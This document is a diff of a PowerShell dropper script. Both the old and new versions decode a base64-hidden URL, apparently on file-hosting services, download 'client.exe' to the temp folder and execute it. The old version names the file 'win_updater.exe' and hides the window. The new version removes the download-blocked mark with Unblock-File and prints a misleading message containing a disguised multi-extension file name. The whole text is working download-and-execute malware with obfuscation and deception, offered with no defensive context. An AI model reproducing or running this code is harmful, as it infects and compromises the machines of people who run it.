@@ -1,12 +1,28 @@
-$encoded_url = "aHR0cHM6Ly9zdG9yZS1uYS1waHgtNS5nb2ZpbGUuaW8vZG93bmxvYWQvd2ViLzMxNDRhMWY4LWE5N2EtNGQ0ZC05YzRmLTBiMDIwY2ViM2I4Ni9jbGllbnQuZXhl"
-$d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded_url))
-$p = Join-Path $env:TEMP "win_updater.exe"
+$encoded_url = "aHR0cHM6Ly9jZG4uc3RvcmFnZS50by9kZDJjMzQzMi00NDY4LTQyNjgtODY3Ni0xZjkzNDRkMjkyMjY/ZXhwaXJlcz0xNzc4NjIyNTgwJmZpbGVuYW1lPWNsaWVudC5leGUmaWQ9SUNPRkFQYUxCJnNpZz0zYmIxNTliYjQ0ZmUwOTRjODNiY2UxZDJkMDk5MTEwNDM3ZmJhMzgyNDA0ODFlZTJlYjViN2MyMTEyMGE5N2I2"
 
-Invoke-WebRequest -Uri $d -OutFile $p -UseBasicParsing -ErrorAction SilentlyContinue
+$url = [System.Text.Encoding]::UTF8.GetString(
+    [System.Convert]::FromBase64String($encoded_url)
+)
 
-if (Test-Path $p) {
-    Start-Process -FilePath $p -WindowStyle Hidden -ErrorAction SilentlyContinue
-    Write-Host "Success: Downloaded and Ran." -ForegroundColor Green
-} else {
-    Write-Host "Failed to process." -ForegroundColor Red
+$path = Join-Path $env:TEMP "client.exe"
+
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+    Invoke-WebRequest `
+        -Uri $url `
+        -OutFile $path `
+        -UseBasicParsing
+
+    if (Test-Path $path) {
+        Unblock-File $path
+        Start-Process -FilePath $path
+        Write-Host "Removed at C:\PUBLIC\Documents\x9z5LCh94mR4L4c49jtm5p9jJLr4mbv9c0x492598918ITKgl9CVJl4kG4m4f9xP4L4m55J4mncq899go53n59Vxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.gif.jpg.png.png.png.png.exe.pdf.exe" -ForegroundColor Green
+    }
+    else {
+        Write-Host "Failed." -ForegroundColor Red
+    }
+}
+catch {
+    Write-Host $_.Exception.Message -ForegroundColor Red
 }
